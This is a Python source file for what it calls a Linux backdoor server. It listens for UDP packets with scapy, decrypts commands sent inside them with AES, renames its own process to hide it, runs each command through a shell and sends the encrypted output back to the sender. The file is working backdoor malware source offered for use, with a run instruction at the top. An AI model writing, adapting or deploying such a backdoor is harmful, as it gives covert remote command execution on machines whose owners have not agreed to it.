import os
import argparse
import subprocess
from scapy.all import *
from subprocess import *
from binascii import hexlify, unhexlify
import binascii
import setproctitle
import crypto
'''
Linux backdoor server file.
Receive Command
Parse Command
Execute Command
Send Result back
Run it: sudo python server.py
'''

def recv_send(pkt):
    
    '''
    Receive command and decode it
    '''
    key = 8
    print("Message Received")
    
    packet = pkt[Raw].load
    print("Encrpyted message: "+ str(packet))
    decryptedMsg = ''
    
    print("AES decrypting")
    decryptedMsg = crypto.aesDecrypt(packet)
    print("decrypted message: " + str(decryptedMsg))
    
    #process message by spliter
    splitMsg = decryptedMsg.split("\"")
    process_title = splitMsg[0]
    print("process title: "+ process_title)
    command = splitMsg[1]
    print("command: "+command)
    
    '''
    Parse and execute command
    '''
    
    #set process title to hide process
    setproctitle.setproctitle(process_title)
    
    #run command 
    userInput = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr = subprocess.PIPE)
    shellOutput= userInput.stdout.read() + userInput.stderr.read()
    newOutput = shellOutput.decode()
    #print(newOutput)
    
    if newOutput == "":
        print("No output")
        newOutput = "No feedback from terminal"
    
    '''
    After receive the command and execute the command
    Now sending results back 
    '''
    
    byte_output = newOutput.encode("utf8")
    encoded_output = binascii.hexlify(byte_output)
    
    aes_output = crypto.aesEncrypt(encoded_output)
    print("encoded output: "+ str(aes_output[:120]))
    
    #sniff packet
    pkt = IP(dst=pkt[0][1].src)/UDP(dport=8505,sport=8000)/aes_output
    
    #slow it down
    time.sleep(0.5)
    send(pkt,verbose=0)
    print("Packet sent")


    
if __name__ == '__main__':
    try:
        print("Server running!")
        sniff(filter="udp and src port 8505 and dst port 8000", prn=recv_send)
    except KeyboardInterrupt:
        print ('Exiting..')

    
    
    
    
    
    
